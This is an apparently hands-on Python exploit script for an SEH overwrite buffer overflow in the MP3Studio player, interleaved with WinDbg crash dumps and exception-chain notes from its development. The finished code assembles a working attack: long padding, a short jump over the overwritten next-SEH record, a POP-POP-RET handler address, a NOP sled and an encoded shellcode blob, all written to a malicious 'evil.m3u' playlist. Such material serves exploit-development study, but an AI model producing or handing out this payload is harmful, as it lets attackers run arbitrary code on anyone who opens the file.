import struct

'''
0:018> g
(f78.1aec): Break instruction exception - code 80000003 (first chance)
eax=00205000 ebx=00000000 ecx=77e4ac70 edx=77e4ac70 esi=77e4ac70 edi=77e4ac70
eip=77e13830 esp=03d7ff44 ebp=03d7ff70 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!DbgBreakPoint:
77e13830 cc              int     3
0:018> !exchain
03d7ff60: ntdll!_except_handler4+0 (77e19780)
  CRT scope  0, filter: ntdll!DbgUiRemoteBreakin+3b (77e4acab)
                func:   ntdll!DbgUiRemoteBreakin+3f (77e4acaf)
03d7ffcc: ntdll!_except_handler4+0 (77e19780)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+3b2d9 (77e42597)
                func:   ntdll!__RtlUserThreadStart+3b375 (77e42633)
03d7ffe4: ntdll!FinalExceptionHandlerPad35+0 (77e265d3)
Invalid exception stack at ffffffff
'''

padding = "http://" + "\x41" * 4105

"""
next_seh_which_we_are_going_to_overwrite = "\x42" * 4
seh_which_we_are_going_to_overwrite = "\x43" * 4
shellcode = "ABCDEFGHIJKJLMNOP"
"""

'''
FIRST EXCEPTION HANDLER

(1548.728): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\mp3-millennium\MP3Studio.exe
eax=0019fa48 ebx=0019fa48 ecx=00000000 edx=00000050 esi=0019ea20 edi=0242508c
eip=00403734 esp=0019ea0c ebp=0019fa50 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
MP3Studio+0x3734:
00403734 8b4af8          mov     ecx,dword ptr [edx-8] ds:002b:00000048=????????
0:000> g
(1548.728): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=77e26480 esi=00000000 edi=00000000
eip=43434343 esp=0019e458 ebp=0019e478 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
43434343 ??              ???
0:000> !exchain
0019e46c: ntdll!ExecuteHandler2+44 (77e26480)
0019fa30: 43434343
Invalid exception stack at 42424242

42424242 -> Shellcode which I will execute after the current SEH
43434343 -> Address of the CURRENT SEH
'''

"""
next_seh_which_we_are_going_to_overwrite = "\xCC" * 4
seh_which_we_are_going_to_overwrite = struct.pack("I", 0x10014F82)
shellcode = "ABCDEFGHIJKJLMNOP"
"""

'''
FIRST EXCEPTION HANDLER

0:000> d esp
0019ea0c  30 38 40 00 48 fa 19 00-00 00 00 00 7c fd 31 02  08@.H.......|.1.
0019ea1c  0b f8 42 00 41 41 41 41-41 41 41 41 41 41 41 41  ..B.AAAAAAAAAAAA
0019ea2c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ea3c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ea4c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ea5c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ea6c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ea7c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000> d fs:[0]
0053:00000000  30 fa 19 00 00 00 1a 00-00 80 19 00 00 00 00 00 0...............
0053:00000010  00 1e 00 00 00 00 00 00-00 c0 31 00 00 00 00 00 ..........1.....
0053:00000020  3c 10 00 00 6c 12 00 00-00 00 00 00 f8 c3 e1 05 <...l...........
0053:00000030  00 90 31 00 00 00 00 00-00 00 00 00 00 00 00 00 ..1.............
0053:00000040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:000> d 0019fa30
0019fa30  cc cc cc cc 82 4f 01 10-41 42 43 44 45 46 47 48  .....O..ABCDEFGH
0019fa40  49 4a 4b 4a 4c 4d 4e 4f-00 00 00 00 00 00 00 00  IJKJLMNO........
0019fa50  58 fc 19 00 82 a8 49 00-c8 fc 19 00 84 fa 19 00  X.....I.........
0019fa60  d0 b3 31 02 ec 11 49 00-60 fc 19 00 12 12 49 00  ..1...I.`.....I.
0019fa70  58 fc 19 00 c8 fc 19 00-94 cf 31 02 d0 b3 31 02  X.........1...1.
0019fa80  2c 32 32 02 c8 04 00 00-b0 d7 00 00 80 00 00 00  ,22.............
0019fa90  00 00 00 00 01 00 00 00-d0 fb 19 00 fb 42 40 00  .............B@.
0019faa0  8c 42 40 00 b3 42 40 00-e3 42 40 00 f9 0b 67 00  .B@..B@..B@...g.
'''

next_seh_which_we_are_going_to_overwrite = "\xeb\x2e\x90\x90"
seh_which_we_are_going_to_overwrite = struct.pack("I", 0x10014F82)

nops = "\x90" * 30
shellcode = ("\xdd\xc3\xd9\x74\x24\xf4\xbd\x92\x9f\x0f\x01\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x13\x03\xfa\x8c\xed\xf4\x06\x5a\x73"
"\xf6\xf6\x9b\x14\x7e\x13\xaa\x14\xe4\x50\x9d\xa4\x6e\x34\x12"
"\x4e\x22\xac\xa1\x22\xeb\xc3\x02\x88\xcd\xea\x93\xa1\x2e\x6d"
"\x10\xb8\x62\x4d\x29\x73\x77\x8c\x6e\x6e\x7a\xdc\x27\xe4\x29"
"\xf0\x4c\xb0\xf1\x7b\x1e\x54\x72\x98\xd7\x57\x53\x0f\x63\x0e"
"\x73\xae\xa0\x3a\x3a\xa8\xa5\x07\xf4\x43\x1d\xf3\x07\x85\x6f"
"\xfc\xa4\xe8\x5f\x0f\xb4\x2d\x67\xf0\xc3\x47\x9b\x8d\xd3\x9c"
"\xe1\x49\x51\x06\x41\x19\xc1\xe2\x73\xce\x94\x61\x7f\xbb\xd3"
"\x2d\x9c\x3a\x37\x46\x98\xb7\xb6\x88\x28\x83\x9c\x0c\x70\x57"
"\xbc\x15\xdc\x36\xc1\x45\xbf\xe7\x67\x0e\x52\xf3\x15\x4d\x3b"
"\x30\x14\x6d\xbb\x5e\x2f\x1e\x89\xc1\x9b\x88\xa1\x8a\x05\x4f"
"\xc5\xa0\xf2\xdf\x38\x4b\x03\xf6\xfe\x1f\x53\x60\xd6\x1f\x38"
"\x70\xd7\xf5\xef\x20\x77\xa6\x4f\x90\x37\x16\x38\xfa\xb7\x49"
"\x58\x05\x12\xe2\xf3\xfc\xf5\xcd\xac\xec\x0b\xa6\xae\x10\x14"
"\xb1\x26\xf6\x7e\xad\x6e\xa1\x16\x54\x2b\x39\x86\x99\xe1\x44"
"\x88\x12\x06\xb9\x47\xd3\x63\xa9\x30\x13\x3e\x93\x97\x2c\x94"
"\xbb\x74\xbe\x73\x3b\xf2\xa3\x2b\x6c\x53\x15\x22\xf8\x49\x0c"
"\x9c\x1e\x90\xc8\xe7\x9a\x4f\x29\xe9\x23\x1d\x15\xcd\x33\xdb"
"\x96\x49\x67\xb3\xc0\x07\xd1\x75\xbb\xe9\x8b\x2f\x10\xa0\x5b"
"\xa9\x5a\x73\x1d\xb6\xb6\x05\xc1\x07\x6f\x50\xfe\xa8\xe7\x54"
"\x87\xd4\x97\x9b\x52\x5d\xb7\x79\x76\xa8\x50\x24\x13\x11\x3d"
"\xd7\xce\x56\x38\x54\xfa\x26\xbf\x44\x8f\x23\xfb\xc2\x7c\x5e"
"\x94\xa6\x82\xcd\x95\xe2")

exploit = nops + shellcode

payload = padding + next_seh_which_we_are_going_to_overwrite + seh_which_we_are_going_to_overwrite + exploit

f = open("evil.m3u", "w")
f.write(payload)
f.close